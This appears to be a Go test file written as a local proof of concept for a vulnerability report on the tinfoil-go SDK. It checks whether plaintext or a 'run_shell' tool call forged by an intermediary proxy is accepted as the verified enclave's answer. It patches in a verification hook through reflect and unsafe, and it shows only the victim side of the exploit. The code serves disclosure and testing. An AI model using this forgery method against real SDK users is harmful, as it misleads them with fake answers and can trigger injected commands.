package tinfoil

// verify3 LOCAL PoC (tightened). Victim side only.
//
// What is real here: every SDK source file is unmodified; the client is built
// by the same call NewClientWithOptions ends in (client.go:77-78) with the
// default transport mode, the default user_cache_secret resolution, and no
// OpenAI options besides an API key (default retries). Traffic goes through
// the stock http.DefaultTransport; the only environment changes are
// SSL_CERT_FILE (trust a local test CA) and HTTPS_PROXY (route through the
// attacker process), both set by the runner before the process starts.
//
// The single test seam: Handle.verify (the hook the enclave package's own
// tests use, verification_state.go:68-71) returns a verification whose HPKE
// key is the genuine enclave process's key, read from the file that process
// wrote. It replaces only the attestation fetch + VerifyV3 step, which cannot
// run offline; the attacker never touches attestation in this attack.

import (
	"context"
	"os"
	"reflect"
	"strings"
	"testing"
	"time"
	"unsafe"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	"github.com/tinfoilsh/tinfoil-go/document"
	"github.com/tinfoilsh/tinfoil-go/enclave"
	"github.com/tinfoilsh/tinfoil-go/verify"
)

func verify3SetSeam(t *testing.T, h *enclave.Handle, f func() (*verify.Verification, error)) {
	t.Helper()
	field := reflect.ValueOf(h).Elem().FieldByName("verify")
	if !field.IsValid() {
		t.Fatal("enclave.Handle has no verify field")
	}
	reflect.NewAt(field.Type(), unsafe.Pointer(field.UnsafeAddr())).Elem().Set(reflect.ValueOf(f))
}

func TestVerify3_EHBPResponseForgery(t *testing.T) {
	mode := os.Getenv("POC_MODE")
	if mode == "" {
		t.Skip("run via run_head.sh (POC_MODE unset)")
	}
	pub, err := os.ReadFile(os.Getenv("POC_PUBKEY_FILE"))
	if err != nil {
		t.Fatal(err)
	}
	hpkeKey := strings.TrimSpace(string(pub))
	const host = "enclave.example.com"

	// Same handle NewClientWithOptions(WithEnclave(host)) creates (client.go:71).
	handle, err := enclave.NewHandle(host, defaultConfigRepo, &enclave.Options{})
	if err != nil {
		t.Fatal(err)
	}
	verify3SetSeam(t, handle, func() (*verify.Verification, error) {
		return &verify.Verification{
			ConfigRepo: defaultConfigRepo,
			CodeTag:    "v-genuine",
			CryptoMaterial: []document.CryptoMaterialItem{
				{ID: document.CryptoMaterialIDTLS, Format: document.KeySPKIFPSHA256V1Format, Data: strings.Repeat("ab", 32)},
				{ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: hpkeKey},
			},
			FreshnessExpiresAt: time.Now().Add(time.Hour),
		}, nil
	})

	baseURL := "" // default: https://<enclave>/v1/
	if os.Getenv("POC_TOPOLOGY") == "proxy" {
		baseURL = "https://proxy.example.com/v1/" // WithBaseURL(...)
	}
	c, err := createClientFromHandle(handle, defaultTransportMode, baseURL,
		resolveUserCacheSecret("", false), option.WithAPIKey("sk-poc"))
	if err != nil {
		t.Fatal(err)
	}
	v := c.Verification()
	t.Logf("client transport=%s enclave=%s verified repo=%s tag=%s hpke=%s...", c.Transport(), c.Enclave(), v.ConfigRepo, v.CodeTag, hpkeKey[:16])

	params := openai.ChatCompletionNewParams{
		Model:    "llama3-3-70b",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("my secret prompt")},
	}
	if mode == "forge-300-toolcall" {
		params.Tools = []openai.ChatCompletionToolUnionParam{openai.ChatCompletionFunctionTool(openai.FunctionDefinitionParam{Name: "run_shell"})}
	}

	// 1) Non-streaming completion, exactly as in the README quick start.
	resp, err := c.Chat.Completions.New(context.Background(), params)
	var content string
	if err != nil {
		t.Logf("RESULT non-streaming: error: %v", err)
	} else {
		content = resp.Choices[0].Message.Content
		t.Logf("RESULT non-streaming: err=nil content=%q", content)
		for _, tc := range resp.Choices[0].Message.ToolCalls {
			t.Logf("RESULT non-streaming: err=nil TOOL CALL %s(%s)", tc.Function.Name, tc.Function.Arguments)
		}
	}

	// 2) Streaming completion.
	var streamed string
	var streamErr error
	if mode != "forge-300-toolcall" {
		stream := c.Chat.Completions.NewStreaming(context.Background(), params)
		for stream.Next() {
			for _, ch := range stream.Current().Choices {
				streamed += ch.Delta.Content
			}
		}
		streamErr = stream.Err()
		stream.Close()
		t.Logf("RESULT streaming:     err=%v content=%q", streamErr, streamed)
	}

	forged := func(s string) bool { return strings.HasPrefix(s, "FORGED BY INTERMEDIARY") }
	switch mode {
	case "honest":
		if err != nil || content != "REAL ENCLAVE ANSWER" || streamErr != nil || streamed != "REAL ENCLAVE STREAM" {
			t.Fatalf("honest path broken: err=%v content=%q streamErr=%v streamed=%q", err, content, streamErr, streamed)
		}
	case "forge-200", "forge-404":
		if err == nil || streamErr == nil {
			t.Fatalf("control: expected errors, got err=%v streamErr=%v", err, streamErr)
		}
	case "forge-300-toolcall":
		if err != nil || len(resp.Choices[0].Message.ToolCalls) != 1 || resp.Choices[0].Message.ToolCalls[0].Function.Name != "run_shell" {
			t.Fatalf("forged tool call not accepted: err=%v", err)
		}
		t.Logf("VERDICT: attacker-written tool call accepted as the verified enclave's answer")
	default:
		if err != nil || !forged(content) || streamErr != nil || !forged(streamed) {
			t.Fatalf("forgery not accepted: err=%v content=%q streamErr=%v streamed=%q", err, content, streamErr, streamed)
		}
		t.Logf("VERDICT: attacker-written plaintext accepted as the verified enclave's answer (streaming and non-streaming)")
	}
}
